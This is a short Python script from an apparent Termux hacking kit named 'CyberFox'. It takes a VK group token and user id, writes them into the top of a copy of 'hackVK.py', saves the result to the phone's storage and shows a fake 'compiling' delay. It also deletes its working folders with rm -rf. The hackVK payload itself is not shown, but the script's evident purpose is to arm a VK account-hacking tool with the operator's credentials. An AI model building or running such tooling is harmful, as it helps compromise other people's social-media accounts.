from core.colors import *
import time
import os
import sys
os.system("rm -rf /sdcard/CyberFox1")
token=input(B+"token your group: "+W)
id=input(B+"your id P.s.(number id): "+W)
os.system("cp $HOME/CyberFox/core/hackVK.py $HOME/CyberFox")
f = open('/data/data/com.termux/files/home/CyberFox/hackVK.py','r+')
lines = f.readlines() 
f.seek(0) 
f.write("token="+"'"+token+"'" +"\n"+ "id="+"'"+id+"'")
for line in lines:
  f.write(line)
f.close()
os.system("mkdir /sdcard/CyberFox1 && cp $HOME/CyberFox/hackVK.py /sdcard/CyberFox1")
print(R+"compiling script..."+W)
time.sleep(7)
os.system("rm -rf $HOME/CyberFox/hackVK.py")
print(B+"complete, your script /sdcard/CyberFox1/hackVK.py"+W)
time.sleep(4)